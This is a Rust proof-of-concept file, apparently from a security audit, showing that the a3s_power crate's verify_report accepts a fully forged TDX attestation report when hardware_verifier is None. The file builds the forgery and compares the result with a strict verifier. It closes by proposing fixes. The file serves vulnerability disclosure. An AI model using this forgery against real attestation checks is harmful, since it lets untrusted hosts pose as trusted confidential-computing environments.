//! Attack #15 — F2 (Power `hardware_verifier: None` opt-in)
//!
//! Drives Power's real, unmodified `verify_report` function (from
//! `a3s_power::verify::verify_report` in `Power/src/verify/mod.rs:115`).
//!
//! Demonstrates that with `VerifyOptions { hardware_verifier: None, .. }`
//! — the value Power's own docstring example uses — the most
//! load-bearing check in the chain (hardware signature against vendor
//! PKI) is silently skipped, and `verify_report` returns `Ok` with
//! `hardware_verified: false`. The caller must remember to check
//! `result.hardware_verified == true` themselves; nothing in the
//! signature of `verify_report` indicates that no signature check was
//! performed.
//!
//! The PoC constructs a completely fake `AttestationReport`
//! (correct `report_data` layout, but no real hardware signature
//! ever produced it) and shows Power's `verify_report` accepts it.
//!
//! This complements Attack 5 (EphemeralML `AirVerifyPolicy::default`)
//! by showing F2 in a different system, against a different primitive:
//! Attack 5 is about *receipt policy fields* defaulted to `None`;
//! Attack 15 is about *hardware signature verification* defaulted to
//! "skip silently."
//!
//! Power's source is NOT modified; the PoC depends on the public
//! `a3s-power` crate API.

use a3s_power::tee::attestation::{build_report_data, AttestationReport, TeeType};
use a3s_power::verify::{verify_report, VerifyOptions};
use chrono::Utc;
use sha2::{Digest, Sha256};

fn main() {
    println!("================================================================");
    println!("Power F2 PoC — `hardware_verifier: None` (Attack #15)");
    println!("================================================================");
    println!();
    println!("Driving the REAL, unmodified function:");
    println!("    a3s_power::verify::verify_report");
    println!("    (see Power/src/verify/mod.rs:115-149)");
    println!();

    // ---- Setup: a fully fake report ----
    //
    // The dishonest prover has access to the host but cannot sign
    // valid TDX / SEV-SNP quotes. They forge an `AttestationReport`
    // value entirely in software, claim `tee_type: Tdx`, and put a
    // valid-looking nonce + model_hash into `report_data` using
    // Power's own `build_report_data` helper.
    //
    // The `raw_report` field is `None`. There is no real TEE signature
    // anywhere in this object — but that doesn't matter because the
    // verifier opted out of checking it.
    let client_nonce: Vec<u8> = b"client-fresh-nonce-32-bytes-aaaa".to_vec();
    let real_model_hash = Sha256::digest(b"honest-llama-3.2-1b-weights").to_vec();

    let report_data = build_report_data(Some(&client_nonce), Some(&real_model_hash));

    let forged_report = AttestationReport {
        version: "1.0".to_string(),
        tee_type: TeeType::Tdx,
        report_data: report_data.clone(),
        measurement: vec![0xAB; 48],
        raw_report: None,
        timestamp: Utc::now(),
        nonce: Some(client_nonce.clone()),
    };

    println!("[+] Forged AttestationReport (no real hardware ever signed it):");
    println!("        tee_type      = {:?}", forged_report.tee_type);
    println!("        report_data   = {} bytes ({})",
        forged_report.report_data.len(),
        hex::encode(&forged_report.report_data[..16]));
    println!("        ...           = {}",
        hex::encode(&forged_report.report_data[16..32]));
    println!("        measurement   = {} ({}B)",
        hex::encode(&forged_report.measurement[..8]),
        forged_report.measurement.len());
    println!("        raw_report    = None (no hardware quote at all)");
    println!("        timestamp     = {}", forged_report.timestamp);
    println!();

    // ---- Scenario 1: Power's documented usage (hardware_verifier: None) ----
    //
    // This is the literal example from Power/src/verify/mod.rs:38-43:
    //     let opts = VerifyOptions { ..., hardware_verifier: None };
    let opts_documented = VerifyOptions {
        nonce: Some(client_nonce.clone()),
        expected_model_hash: Some(real_model_hash.clone()),
        expected_measurement: Some(vec![0xAB; 48]),
        hardware_verifier: None,
    };

    println!("================================================================");
    println!("Scenario 1 — Power's documented usage (`hardware_verifier: None`)");
    println!("================================================================");
    println!();
    let r1 = verify_report(&forged_report, &opts_documented);
    match &r1 {
        Ok(res) => {
            println!("    verify_report(forged_report, opts) = Ok(VerifyResult {{");
            println!("        tee_type:              {:?},", res.tee_type);
            println!("        nonce_verified:        {},", res.nonce_verified);
            println!("        model_hash_verified:   {},", res.model_hash_verified);
            println!("        measurement_verified:  {},", res.measurement_verified);
            println!("        hardware_verified:     {},  <-- FALSE", res.hardware_verified);
            println!("    }})");
            assert!(
                !res.hardware_verified,
                "expected hardware_verified == false with verifier None"
            );
            assert!(res.nonce_verified);
            assert!(res.model_hash_verified);
            assert!(res.measurement_verified);
        }
        Err(e) => {
            println!("    verify_report returned Err: {:?}", e);
            std::process::exit(2);
        }
    }
    println!();
    println!("    Power's `verify_report` returns Ok despite no hardware");
    println!("    signature ever being checked. The boolean is buried in");
    println!("    `VerifyResult.hardware_verified` and the caller has to");
    println!("    remember to check it. A caller that wraps:");
    println!();
    println!("        if verify_report(&r, &opts).is_ok() {{ accept(); }}");
    println!();
    println!("    accepts the forged report. This is the documented");
    println!("    `VerifyOptions::default` pattern in Power's own crate docs");
    println!("    (Power/src/verify/mod.rs:38-43).");
    println!();

    // ---- Scenario 2: Strict verifier with a real HardwareVerifier ----
    //
    // For comparison: a caller that DOES wire up a HardwareVerifier
    // (e.g., SevSnpVerifier or TdxVerifier from Power's
    // `hw_verify` module) would catch the forgery.
    //
    // We can't run the real verifier without genuine hardware reports,
    // but we can demonstrate the structure with an `AlwaysFail`
    // verifier that mirrors what a real one would do for an invalid
    // signature.
    struct AlwaysFail;
    impl a3s_power::verify::HardwareVerifier for AlwaysFail {
        fn verify_hardware_signature(
            &self,
            _report: &AttestationReport,
        ) -> a3s_power::error::Result<()> {
            Err(a3s_power::error::PowerError::AttestationVerificationFailed(
                "no valid AMD KDS / Intel PCS signature on report.raw_report"
                    .to_string(),
            ))
        }
    }
    let strict_verifier = AlwaysFail;
    let opts_strict = VerifyOptions {
        nonce: Some(client_nonce.clone()),
        expected_model_hash: Some(real_model_hash.clone()),
        expected_measurement: Some(vec![0xAB; 48]),
        hardware_verifier: Some(&strict_verifier),
    };

    println!("================================================================");
    println!("Scenario 2 — strict caller wires up a real HardwareVerifier");
    println!("================================================================");
    println!();
    let r2 = verify_report(&forged_report, &opts_strict);
    match &r2 {
        Ok(res) => {
            println!("    verify_report = Ok({:?})", res);
            println!("    [!] Strict verifier accepted forged report — unexpected.");
            std::process::exit(2);
        }
        Err(e) => {
            println!("    verify_report(forged_report, strict_opts) = Err");
            println!("        \"{}\"", e);
            println!();
            println!("    [+] Strict verifier rejected the forged report, as");
            println!("        intended. The difference between Scenario 1 and");
            println!("        Scenario 2 is one Option<>::Some — and Power's");
            println!("        documented example sets it to None.");
        }
    }
    println!();

    // ---- Result ----
    println!("================================================================");
    println!("Result");
    println!("================================================================");
    println!();
    println!("    [+] ATTACK CONFIRMED (F2 — opt-in policy: hardware_verifier)");
    println!();
    println!("    Power's `VerifyOptions::hardware_verifier: Option<>` defaults");
    println!("    to `None` in every documented example. With None, the most");
    println!("    load-bearing check in the chain — vendor-PKI signature");
    println!("    verification — is silently skipped and the return type");
    println!("    hides the skip in a bool buried inside VerifyResult.");
    println!();
    println!("    Fix:");
    println!("        - Make `hardware_verifier` non-Option (mandatory), OR");
    println!("        - Have `verify_report` return Err when `hardware_verifier`");
    println!("          is None and report.raw_report is Some, OR");
    println!("        - Have the type itself be `VerifyOptions::new(verifier)`");
    println!("          with no constructor path that yields None.");
    println!();
    println!("    Pair this with Attack 5 (EphemeralML default policy): two");
    println!("    different systems, two different library primitives, same");
    println!("    `Option<>`-defaults-to-skip pattern.");
}
